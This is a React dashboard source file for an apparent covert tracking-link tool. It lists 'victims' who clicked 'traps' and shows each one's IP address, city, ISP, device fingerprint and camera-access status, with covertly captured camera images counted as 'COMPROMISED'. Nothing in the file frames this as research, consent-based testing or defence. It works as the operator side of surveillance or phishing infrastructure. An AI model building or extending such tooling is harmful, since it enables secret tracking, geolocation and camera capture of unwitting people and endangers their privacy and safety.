import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { 
  BarChart3, 
  MapPin, 
  Smartphone, 
  Laptop, 
  Tablet, 
  Camera,
  Download,
  Search,
  Eye,
  Clock,
  Globe,
  Monitor,
  Shield,
  Wifi,
  Battery,
  Cpu
} from "lucide-react";
import { formatDistanceToNow, format } from "date-fns";
import type { TrackingClick, TrackingLink } from "@shared/schema";

interface VictimData extends TrackingClick {
  linkInfo?: TrackingLink;
}

export default function Analytics() {
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedVictim, setSelectedVictim] = useState<VictimData | null>(null);

  const { data: clicks = [] } = useQuery<TrackingClick[]>({
    queryKey: ['/api/clicks'],
  });

  const { data: links = [] } = useQuery<TrackingLink[]>({
    queryKey: ['/api/links'],
  });

  // Combine clicks with link info for victim data
  const victims: VictimData[] = clicks.map(click => ({
    ...click,
    linkInfo: links.find(link => link.id === click.linkId)
  }));

  // Filter victims based on search
  const filteredVictims = victims.filter(victim => {
    if (!searchTerm) return true;
    const searchLower = searchTerm.toLowerCase();
    return (
      victim.ipAddress?.toLowerCase().includes(searchLower) ||
      victim.linkInfo?.campaignName?.toLowerCase().includes(searchLower) ||
      (victim.location as any)?.country?.toLowerCase().includes(searchLower) ||
      (victim.deviceInfo as any)?.browser?.toLowerCase().includes(searchLower)
    );
  });

  const formatDeviceInfo = (deviceInfo: any) => {
    if (!deviceInfo) return {};
    return {
      userAgent: deviceInfo.userAgent || 'Unknown',
      platform: deviceInfo.platform || 'Unknown',
      browser: deviceInfo.browser || 'Unknown',
      os: deviceInfo.os || 'Unknown',
      type: deviceInfo.type || 'Unknown',
      language: deviceInfo.language || 'Unknown',
      cookieEnabled: deviceInfo.cookieEnabled ?? false,
      webdriver: deviceInfo.webdriver ?? false,
    };
  };

  const formatLocationInfo = (location: any) => {
    if (!location) return {};
    return {
      country: location.country || 'Unknown',
      region: location.region || 'Unknown', 
      city: location.city || 'Unknown',
      timezone: location.timezone || 'Unknown',
      isp: location.isp || 'Unknown',
    };
  };

  const VictimDetailsModal = ({ victim }: { victim: VictimData }) => {
    const device = formatDeviceInfo(victim.deviceInfo);
    const location = formatLocationInfo(victim.location);
    
    return (
      <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
        <div className="bg-black text-green-400 p-6 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto font-mono border border-green-500">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-xl font-bold text-green-400">✅ VICTIM INFORMATION</h2>
            <Button 
              variant="ghost" 
              onClick={() => setSelectedVictim(null)}
              className="text-green-400 hover:text-green-300"
            >
              ✕
            </Button>
          </div>
          
          <div className="space-y-6">
            {/* IP and Time */}
            <div className="border border-green-500 p-4 rounded">
              <div className="text-green-300 mb-2">⚓ IP: {victim.ipAddress || 'Unknown'} 
                {victim.ipAddress && (
                  <a 
                    href={`https://ip-api.com/#${victim.ipAddress}`} 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-cyan-400 underline ml-2"
                  >
                    (https://ip-api.com/#{victim.ipAddress})
                  </a>
                )}
                | Time: {format(new Date(victim.timestamp), 'yyyy-MM-dd:HH:mm:ss')}
              </div>
              <div className="text-green-300">
                ⏳ Date In Victim's Device: {new Date(victim.timestamp).toString()}
              </div>
            </div>

            {/* Device Information */}
            <div className="border border-green-500 p-4 rounded">
              <h3 className="text-green-300 font-bold mb-3">📱 Device Information</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
                <div>platform: {device.platform}</div>
                <div>browser: {device.browser}</div>
                <div>os: {device.os}</div>
                <div>type: {device.type}</div>
                <div>language: {device.language}</div>
                <div>cookieEnabled: {device.cookieEnabled.toString()}</div>
                <div>webdriver: {device.webdriver.toString()}</div>
              </div>
              {device.userAgent && (
                <div className="mt-3 p-2 bg-gray-900 rounded text-xs">
                  <div className="text-green-300">userAgent:</div>
                  <div className="break-all">{device.userAgent}</div>
                </div>
              )}
            </div>

            {/* Location Information */}
            {Object.keys(location).length > 0 && (
              <div className="border border-green-500 p-4 rounded">
                <h3 className="text-green-300 font-bold mb-3">🌍 Location Information</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
                  <div>country: {location.country}</div>
                  <div>region: {location.region}</div>
                  <div>city: {location.city}</div>
                  <div>timezone: {location.timezone}</div>
                  <div>isp: {location.isp}</div>
                </div>
              </div>
            )}

            {/* Media Device Information */}
            {victim.cameraAccess && victim.cameraAccess !== 'not_requested' && (
              <div className="border border-green-500 p-4 rounded">
                <h3 className="text-green-300 font-bold mb-3">📷 Media Device Information</h3>
                <div className="text-sm space-y-2">
                  <div>Camera Access: {victim.cameraAccess === 'granted' ? '✅ Granted' : '❌ Denied'}</div>
                  <div className="text-yellow-400">⚠️ Camera access was requested</div>
                  
                  {/* Captured Image */}
                  {victim.capturedImage && (
                    <div className="mt-4">
                      <div className="text-green-300 font-bold mb-2">📸 Captured Image:</div>
                      <div className="border border-green-400 p-2 rounded bg-gray-800">
                        <img 
                          src={victim.capturedImage} 
                          alt="Victim capture" 
                          className="max-w-full h-auto rounded border border-green-500"
                          style={{ maxHeight: '300px' }}
                        />
                        <div className="text-xs text-green-400 mt-2">
                          Image captured: {format(new Date(victim.timestamp), 'yyyy-MM-dd HH:mm:ss')}
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {victim.cameraAccess === 'granted' && !victim.capturedImage && (
                    <div className="text-yellow-400">📷 Camera accessed but no image captured</div>
                  )}
                </div>
              </div>
            )}

            {/* Campaign Information */}
            {victim.linkInfo && (
              <div className="border border-green-500 p-4 rounded">
                <h3 className="text-green-300 font-bold mb-3">🎯 Campaign Information</h3>
                <div className="text-sm space-y-1">
                  <div>Campaign: {victim.linkInfo.campaignName || 'Default'}</div>
                  <div>Original URL: {victim.linkInfo.originalUrl}</div>
                  <div>Short Code: {victim.linkInfo.shortCode}</div>
                  <div>Status: {victim.linkInfo.isActive ? '🟢 Active' : '🔴 Inactive'}</div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black text-green-400 p-6 font-mono">
      <div className="mb-8">
        <h1 className="text-3xl font-bold text-green-400 mb-2">🔍 VICTIM ANALYTICS</h1>
        <p className="text-green-300">Real-time tracking and surveillance data</p>
      </div>

      {/* Search Bar */}
      <div className="mb-6">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-green-500" />
          <Input
            placeholder="Search by IP, country, browser, campaign..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10 bg-gray-900 border-green-500 text-green-400 placeholder-green-600"
          />
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
        <Card className="bg-gray-900 border-green-500">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-green-300">TOTAL VICTIMS</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-400">{victims.length}</div>
          </CardContent>
        </Card>
        
        <Card className="bg-gray-900 border-green-500">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-green-300">ACTIVE TRAPS</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-400">{links.filter(l => l.isActive).length}</div>
          </CardContent>
        </Card>
        
        <Card className="bg-gray-900 border-green-500">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-green-300">CAMERA ACCESS</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-yellow-400">
              {victims.filter(v => v.cameraAccess === 'granted').length}
            </div>
          </CardContent>
        </Card>
        
        <Card className="bg-gray-900 border-green-500">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-green-300">COUNTRIES</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-400">
              {new Set(victims.map(v => (v.location as any)?.country).filter(Boolean)).size}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Victim Table */}
      <Card className="bg-gray-900 border-green-500">
        <CardHeader>
          <CardTitle className="flex items-center text-green-400">
            <Shield className="h-5 w-5 mr-2" />
            VICTIM DATABASE
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow className="border-green-500">
                  <TableHead className="text-green-300">TARGET IP</TableHead>
                  <TableHead className="text-green-300">LOCATION</TableHead>
                  <TableHead className="text-green-300">DEVICE</TableHead>
                  <TableHead className="text-green-300">STATUS</TableHead>
                  <TableHead className="text-green-300">COMPROMISED</TableHead>
                  <TableHead className="text-green-300">ACTIONS</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredVictims.map((victim) => {
                  const location = victim.location as any;
                  const device = victim.deviceInfo as any;
                  
                  return (
                    <TableRow key={victim.id} className="border-green-500/20 hover:bg-gray-800">
                      <TableCell className="font-mono text-green-400">
                        {victim.ipAddress || 'UNKNOWN'}
                      </TableCell>
                      <TableCell className="text-green-300">
                        <div className="flex items-center">
                          <Globe className="h-4 w-4 mr-1" />
                          {location?.country || 'UNKNOWN'}
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge 
                          variant="secondary" 
                          className="bg-gray-800 text-green-400 border-green-500"
                        >
                          {device?.type || 'UNKNOWN'}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Badge 
                          variant={victim.cameraAccess === 'granted' ? 'destructive' : 'secondary'}
                          className={victim.cameraAccess === 'granted' 
                            ? 'bg-red-900 text-red-300' 
                            : 'bg-gray-800 text-yellow-400'
                          }
                        >
                          {victim.cameraAccess === 'granted' ? '🔴 COMPROMISED' : '🟡 TRACKED'}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-green-300 text-xs">
                        {formatDistanceToNow(new Date(victim.timestamp), { addSuffix: true })}
                      </TableCell>
                      <TableCell>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setSelectedVictim(victim)}
                          className="border-green-500 text-green-400 hover:bg-green-900"
                        >
                          <Eye className="h-4 w-4 mr-1" />
                          ANALYZE
                        </Button>
                      </TableCell>
                    </TableRow>
                  );
                })}
              </TableBody>
            </Table>
          </div>
          
          {filteredVictims.length === 0 && (
            <div className="text-center py-12">
              <Shield className="h-12 w-12 mx-auto mb-4 text-green-600" />
              <h3 className="text-lg font-medium text-green-400 mb-2">NO VICTIMS FOUND</h3>
              <p className="text-green-300">
                {searchTerm ? "Adjust your search parameters" : "Deploy tracking links to capture targets"}
              </p>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Victim Details Modal */}
      {selectedVictim && <VictimDetailsModal victim={selectedVictim} />}
    </div>
  );
}